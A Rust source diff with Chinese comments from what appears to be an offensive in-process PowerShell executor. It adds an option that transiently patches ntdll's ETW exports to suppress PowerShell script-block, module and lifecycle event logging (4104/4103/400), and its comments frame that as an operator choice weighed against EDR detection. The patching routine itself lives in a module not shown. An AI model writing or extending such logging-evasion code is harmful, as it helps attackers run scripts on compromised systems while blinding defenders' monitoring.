@@ -12,8 +12,27 @@
 //! 脚本超时由 stub 内 Task.Wait(timeout) 控制，超时后 ps.Stop()。
 
 pub mod clr_host;
+pub mod etw;
 
 /// 在宿主进程内执行 PowerShell 脚本，返回结果字符串（JSON 或错误描述）。
 pub fn execute_inline(script: &str, timeout_secs: u64) -> String {
+    execute_inline_opts(script, timeout_secs, false)
+}
+
+/// 带选项的执行入口。
+///
+/// `suppress_etw = true` 时，在执行窗口内瞬态 patch 本进程 ntdll 的 ETW
+/// 导出，抑制 PowerShell 引擎的 ScriptBlock/Module/生命周期事件日志
+/// （Event Log 4104/4103/400 等）。执行结束（含错误路径）自动恢复。
+///
+/// 注意：patch 系统 DLL 代码段是 EDR 行为检测的高危信号，默认关闭；
+/// 仅在操作员确认环境后显式开启。
+pub fn execute_inline_opts(script: &str, timeout_secs: u64, suppress_etw: bool) -> String {
+    // ETW 抑制器：作用域内生效，Drop 自动恢复（所有提前 return 均覆盖）
+    let _etw = if suppress_etw {
+        etw::EtwSuppressor::suppress()
+    } else {
+        None
+    };
     clr_host::execute_inline(script, timeout_secs)
 }
